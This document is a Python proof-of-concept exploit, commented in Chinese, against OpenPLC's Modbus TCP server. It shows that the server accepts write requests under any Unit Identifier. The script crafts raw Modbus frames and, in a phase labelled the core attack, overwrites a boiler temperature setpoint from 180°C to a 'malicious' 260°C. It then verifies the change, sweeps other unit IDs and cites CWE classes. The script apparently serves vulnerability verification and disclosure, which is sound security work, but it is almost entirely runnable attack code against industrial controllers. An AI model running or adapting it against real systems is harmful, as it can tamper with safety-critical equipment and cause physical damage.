#!/usr/bin/env python3
"""
POC: Write Multiple Registers - Unit Identifier (FC=16)

验证 OpenPLC 对 MBAP Header 中 Unit Identifier 字段不做任何校验的安全缺陷。
攻击者可以使用任意 unit_id 值发送 FC=16 请求，OpenPLC 均会接受并执行写入。

攻击场景：在 Modbus TCP-to-RTU 网关环境中，攻击者通过设置 unit_id=0x07
将 PDU 路由到特定的锅炉控制 PLC，写入危险温度设定值 260°C。
"""

import socket
import struct
import sys
import time

TARGET_HOST = "172.20.0.10"
TARGET_PORT = 502
TIMEOUT = 5

REGISTER_ADDR = 0x0064  # holding register 100
SAFE_VALUE = 180         # 正常温度设定值 (°C)
MALICIOUS_VALUE = 260    # 恶意温度设定值 (°C) - 0x0104

UNIT_IDS_TO_TEST = [
    (0x01, "默认 unit_id"),
    (0x07, "POC 目标 - 锅炉控制 PLC"),
    (0x00, "广播地址"),
    (0xFF, "最大值"),
    (0x42, "随机非法值"),
]


def build_fc16_request(transaction_id, unit_id, start_addr, values):
    """构造 FC=16 Write Multiple Registers 完整 Modbus TCP ADU"""
    quantity = len(values)
    byte_count = quantity * 2

    pdu = struct.pack('>B', 0x10)                    # Function Code
    pdu += struct.pack('>H', start_addr)             # Starting Address
    pdu += struct.pack('>H', quantity)               # Quantity of Registers
    pdu += struct.pack('>B', byte_count)             # Byte Count
    for v in values:
        pdu += struct.pack('>H', v)                  # Register Values

    length = 1 + len(pdu)  # unit_id (1 byte) + PDU
    mbap = struct.pack('>H', transaction_id)         # Transaction ID
    mbap += struct.pack('>H', 0x0000)                # Protocol ID (Modbus)
    mbap += struct.pack('>H', length)                # Length
    mbap += struct.pack('>B', unit_id)               # Unit Identifier

    return mbap + pdu


def build_fc03_request(transaction_id, unit_id, start_addr, quantity):
    """构造 FC=3 Read Holding Registers 请求"""
    pdu = struct.pack('>B', 0x03)
    pdu += struct.pack('>H', start_addr)
    pdu += struct.pack('>H', quantity)

    length = 1 + len(pdu)
    mbap = struct.pack('>H', transaction_id)
    mbap += struct.pack('>H', 0x0000)
    mbap += struct.pack('>H', length)
    mbap += struct.pack('>B', unit_id)

    return mbap + pdu


def send_recv(sock, data, label=""):
    """发送请求并接收响应"""
    hex_str = data.hex()
    formatted = ' '.join(hex_str[i:i+2] for i in range(0, len(hex_str), 2))
    print(f"  [TX] {label}")
    print(f"       {formatted}")
    sock.sendall(data)

    resp = sock.recv(1024)
    hex_str = resp.hex()
    formatted = ' '.join(hex_str[i:i+2] for i in range(0, len(hex_str), 2))
    print(f"  [RX] {formatted}")
    return resp


def parse_fc16_response(resp):
    """解析 FC=16 响应"""
    if len(resp) < 12:
        return None, "响应过短"

    unit_id = resp[6]
    fc = resp[7]

    if fc == 0x90:  # FC=16 error
        error_code = resp[8]
        error_names = {1: "ILLEGAL_FUNCTION", 2: "ILLEGAL_DATA_ADDRESS",
                       3: "ILLEGAL_DATA_VALUE", 4: "SLAVE_DEVICE_FAILURE"}
        return None, f"错误: {error_names.get(error_code, f'0x{error_code:02X}')}"

    if fc == 0x10:
        start_addr = struct.unpack('>H', resp[8:10])[0]
        quantity = struct.unpack('>H', resp[10:12])[0]
        return {
            "unit_id": unit_id,
            "start_addr": start_addr,
            "quantity": quantity,
        }, "成功"

    return None, f"未知功能码: 0x{fc:02X}"


def parse_fc03_response(resp):
    """解析 FC=3 响应"""
    if len(resp) < 9:
        return None, "响应过短"

    unit_id = resp[6]
    fc = resp[7]

    if fc == 0x83:
        error_code = resp[8]
        return None, f"读取错误: 0x{error_code:02X}"

    if fc == 0x03:
        byte_count = resp[8]
        values = []
        for i in range(0, byte_count, 2):
            val = struct.unpack('>H', resp[9+i:11+i])[0]
            values.append(val)
        return {"unit_id": unit_id, "values": values}, "成功"

    return None, f"未知功能码: 0x{fc:02X}"


def run_poc():
    print("=" * 70)
    print("POC: Write Multiple Registers - Unit Identifier 验证")
    print("=" * 70)
    print(f"目标: {TARGET_HOST}:{TARGET_PORT}")
    print(f"寄存器地址: 0x{REGISTER_ADDR:04X} (decimal {REGISTER_ADDR})")
    print(f"恶意值: {MALICIOUS_VALUE} (0x{MALICIOUS_VALUE:04X}) - 锅炉温度设定值")
    print()

    # =============================================================
    # 阶段 1: 使用默认 unit_id=0x01 设置初始值
    # =============================================================
    print("-" * 70)
    print("阶段 1: 使用默认 unit_id=0x01 设置初始安全值")
    print("-" * 70)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(TIMEOUT)
    sock.connect((TARGET_HOST, TARGET_PORT))

    req = build_fc16_request(0x0001, 0x01, REGISTER_ADDR, [SAFE_VALUE])
    resp = send_recv(sock, req, f"FC=16 写入 unit_id=0x01, 值={SAFE_VALUE}")
    result, msg = parse_fc16_response(resp)
    if result:
        print(f"  [OK] 初始化成功: 写入 {SAFE_VALUE} 到地址 0x{REGISTER_ADDR:04X}")
    else:
        print(f"  [FAIL] 初始化失败: {msg}")
        sock.close()
        return

    time.sleep(0.3)

    # 验证初始值
    req = build_fc03_request(0x0002, 0x01, REGISTER_ADDR, 1)
    resp = send_recv(sock, req, "FC=3 读取验证初始值")
    result, msg = parse_fc03_response(resp)
    if result:
        print(f"  [OK] 当前值: {result['values'][0]} (预期 {SAFE_VALUE})")
    sock.close()

    print()

    # =============================================================
    # 阶段 2: 核心攻击 - 使用 unit_id=0x07 写入恶意值
    # =============================================================
    print("-" * 70)
    print("阶段 2: 核心攻击 - 使用 unit_id=0x07 写入恶意温度值")
    print("-" * 70)
    print(f"  攻击载荷: unit_id=0x07, 地址=0x{REGISTER_ADDR:04X}, "
          f"值={MALICIOUS_VALUE} (0x{MALICIOUS_VALUE:04X})")
    print()

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(TIMEOUT)
    sock.connect((TARGET_HOST, TARGET_PORT))

    req = build_fc16_request(0x0003, 0x07, REGISTER_ADDR, [MALICIOUS_VALUE])
    print("  --- 发送 POC 攻击报文 ---")
    resp = send_recv(sock, req, f"FC=16 写入 unit_id=0x07, 值={MALICIOUS_VALUE}")
    result, msg = parse_fc16_response(resp)

    attack_success = False
    if result:
        print(f"\n  [!] 攻击成功! OpenPLC 接受了 unit_id=0x07 的写入请求")
        print(f"      响应中的 unit_id: 0x{result['unit_id']:02X}")
        print(f"      写入地址: 0x{result['start_addr']:04X}")
        print(f"      写入数量: {result['quantity']}")
        attack_success = True
    else:
        print(f"\n  [X] 攻击被拒绝: {msg}")

    time.sleep(0.3)

    # 验证攻击效果
    print()
    print("  --- 验证寄存器值是否被篡改 ---")
    req = build_fc03_request(0x0004, 0x01, REGISTER_ADDR, 1)
    resp = send_recv(sock, req, "FC=3 读取寄存器值")
    result, msg = parse_fc03_response(resp)
    if result:
        actual_val = result['values'][0]
        if actual_val == MALICIOUS_VALUE:
            print(f"  [!] 确认: 寄存器已被篡改为 {actual_val} (恶意值)")
            print(f"      锅炉温度设定值从 {SAFE_VALUE}°C 被改为 {MALICIOUS_VALUE}°C!")
        else:
            print(f"  [?] 当前值: {actual_val} (预期 {MALICIOUS_VALUE})")

    sock.close()
    print()

    # =============================================================
    # 阶段 3: 全面测试 - 多种 unit_id 值均可写入
    # =============================================================
    print("-" * 70)
    print("阶段 3: 全面测试 - 验证 OpenPLC 接受任意 Unit Identifier")
    print("-" * 70)
    print()

    results_table = []
    txn_id = 0x0010

    for uid, desc in UNIT_IDS_TO_TEST:
        test_value = 100 + uid  # 每个 unit_id 写入不同值便于区分
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(TIMEOUT)
        try:
            sock.connect((TARGET_HOST, TARGET_PORT))

            print(f"  测试 unit_id=0x{uid:02X} ({desc}):")

            # 写入
            req = build_fc16_request(txn_id, uid, REGISTER_ADDR, [test_value])
            resp = send_recv(sock, req, f"写入 unit_id=0x{uid:02X}, 值={test_value}")
            result, msg = parse_fc16_response(resp)

            write_ok = result is not None
            resp_uid = result['unit_id'] if result else None

            # 回读验证
            time.sleep(0.2)
            req = build_fc03_request(txn_id + 1, uid, REGISTER_ADDR, 1)
            resp = send_recv(sock, req, f"回读 unit_id=0x{uid:02X}")
            read_result, read_msg = parse_fc03_response(resp)

            read_val = read_result['values'][0] if read_result else None
            read_ok = (read_val == test_value)

            status = "✓ 接受" if write_ok else "✗ 拒绝"
            results_table.append((uid, desc, write_ok, resp_uid, read_val, test_value))

            if write_ok and read_ok:
                print(f"    -> {status} | 响应 unit_id=0x{resp_uid:02X} | "
                      f"值={read_val} (正确)")
            elif write_ok:
                print(f"    -> {status} | 响应 unit_id=0x{resp_uid:02X} | "
                      f"值={read_val} (预期 {test_value})")
            else:
                print(f"    -> {status} | {msg}")

            print()
            txn_id += 2

        except Exception as e:
            print(f"    -> 连接错误: {e}")
            results_table.append((uid, desc, False, None, None, test_value))
        finally:
            sock.close()
            time.sleep(0.2)

    # =============================================================
    # 阶段 4: 恢复安全值
    # =============================================================
    print("-" * 70)
    print("阶段 4: 恢复安全设定值")
    print("-" * 70)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(TIMEOUT)
    sock.connect((TARGET_HOST, TARGET_PORT))

    req = build_fc16_request(0x00FF, 0x01, REGISTER_ADDR, [0])
    resp = send_recv(sock, req, "FC=16 恢复寄存器值为 0")
    result, msg = parse_fc16_response(resp)
    if result:
        print(f"  [OK] 已恢复寄存器 0x{REGISTER_ADDR:04X} 为 0")
    sock.close()

    # =============================================================
    # 汇总报告
    # =============================================================
    print()
    print("=" * 70)
    print("验证结果汇总")
    print("=" * 70)
    print()
    print(f"  {'Unit ID':<12} {'描述':<30} {'写入':<8} {'响应UID':<10} {'读回值':<10}")
    print(f"  {'-'*12} {'-'*30} {'-'*8} {'-'*10} {'-'*10}")

    accepted_count = 0
    for uid, desc, write_ok, resp_uid, read_val, expected in results_table:
        w = "✓" if write_ok else "✗"
        r_uid = f"0x{resp_uid:02X}" if resp_uid is not None else "N/A"
        r_val = str(read_val) if read_val is not None else "N/A"
        print(f"  0x{uid:02X}         {desc:<30} {w:<8} {r_uid:<10} {r_val:<10}")
        if write_ok:
            accepted_count += 1

    print()
    print(f"  测试 {len(UNIT_IDS_TO_TEST)} 个 Unit ID，{accepted_count} 个被接受")
    print()

    if accepted_count == len(UNIT_IDS_TO_TEST):
        print("  [!] 安全发现: OpenPLC 对 Unit Identifier 完全不做任何校验!")
        print("      任意 unit_id (0x00-0xFF) 的 FC=16 请求均被接受并执行。")
        print()
        print("  [!] 攻击影响:")
        print("      在 Modbus TCP-to-RTU 网关环境中，攻击者可通过指定任意")
        print("      Unit Identifier，将恶意写入请求路由到任何下游 PLC/RTU，")
        print("      包括安全关键设备（如锅炉控制器），造成物理损害。")
        print()
        print("  CWE 分类:")
        print("    - CWE-287: Improper Authentication")
        print("    - CWE-284: Improper Access Control")
        print("    - CWE-306: Missing Authentication for Critical Function")
    elif attack_success:
        print("  [!] 核心攻击成功: unit_id=0x07 的写入被接受")
    else:
        print("  [i] 部分或全部 unit_id 被拒绝")

    print()
    print("=" * 70)
    print("POC 验证完成")
    print("=" * 70)


if __name__ == "__main__":
    run_poc()
